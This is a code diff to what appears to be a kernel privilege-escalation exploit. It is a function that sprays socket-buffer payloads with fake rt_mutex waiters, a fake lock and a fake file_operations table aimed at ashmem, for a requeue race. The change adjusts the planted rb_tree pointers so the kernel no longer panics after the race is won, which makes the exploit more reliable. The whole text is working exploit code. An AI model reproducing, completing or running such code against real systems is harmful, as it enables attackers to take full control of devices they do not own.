@@ -1815,6 +1815,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   /* Black-box recorder: dump every planted waiter/fops value before the
    * kernel ever touches the payload, so a crash during the requeue race
    * can be attributed to an exact (address,value) pair afterwards. */
+  const uintptr_t fops_tree_parent = (payload_mode == PAGE_PAYLOAD_FOPS)
+                                         ? (fake_lock + 0x08)
+                                         : (uintptr_t)1;
+  const uintptr_t fops_pi_parent = (payload_mode == PAGE_PAYLOAD_FOPS)
+                                       ? (fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF)
+                                       : write_pc;
+  const uintptr_t fops_pi_right = (payload_mode == PAGE_PAYLOAD_FOPS)
+                                      ? (uintptr_t)0
+                                      : write_right;
   pr_info("fops payload plant tree_parent=%016zx tree_right=%016zx "
           "tree_left=%016zx pi_parent=%016zx pi_right=%016zx "
           "pi_left=%016zx task=%016lx lock=%016zx prio=%u "
@@ -1822,12 +1831,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           "fops.llseek=%016zx fops.read_iter=%016zx "
           "fops.write_iter=%016zx fops.ioctl=%016zx "
           "fops.compat=%016zx target_ashmem_fops=%016zx\n",
-          (uintptr_t)1, (uintptr_t)0, (uintptr_t)0, write_pc, write_right,
-          write_left, (unsigned long)waiter_task, fake_lock, waiter_prio,
-          (unsigned long)task_group, (unsigned long)pi_top_task, fake_fops,
-          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF, text_addr(CONFIGFS_READ_ITER),
-          text_addr(CONFIGFS_BIN_WRITE_ITER), text_addr(ASHMEM_IOCTL),
-          text_addr(ASHMEM_COMPAT_IOCTL), data_addr(ASHMEM_MISC_FOPS));
+          fops_tree_parent, (uintptr_t)0, (uintptr_t)0, fops_pi_parent,
+          fops_pi_right, (uintptr_t)0, (unsigned long)waiter_task, fake_lock,
+          waiter_prio, (unsigned long)task_group, (unsigned long)pi_top_task,
+          fake_fops, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF,
+          text_addr(CONFIGFS_READ_ITER), text_addr(CONFIGFS_BIN_WRITE_ITER),
+          text_addr(ASHMEM_IOCTL), text_addr(ASHMEM_COMPAT_IOCTL),
+          data_addr(ASHMEM_MISC_FOPS));
 
   for (size_t chunk = 0;
        chunk + SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
@@ -1845,7 +1855,26 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
+    /* FOPS route: waiter must look like the root of an empty rb_tree so
+     * rb_erase() simply clears lock->waiters.  tree_parent points to the
+     * lock's waiters root; pi_parent points to a harmless zeroed rb_node
+     * inside the payload.  The old values (1 / fake_fops) made the kernel
+     * dereference garbage and panic after the race won. */
+    uintptr_t tree_parent = 1;
+    uintptr_t tree_right = 0;
+    uintptr_t tree_left = 0;
+    uintptr_t pi_parent = write_pc;
+    uintptr_t pi_right = write_right;
+    uintptr_t pi_left = write_left;
+    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+      tree_parent = fake_lock + 0x08;
+      pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
+      pi_right = 0;
+      pi_left = 0;
+    }
+
+    put_fake_waiter(p, W0_OFF, tree_parent, tree_right, tree_left,
+                    pi_parent, pi_right, pi_left,
                     waiter_task, fake_lock, waiter_prio);
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
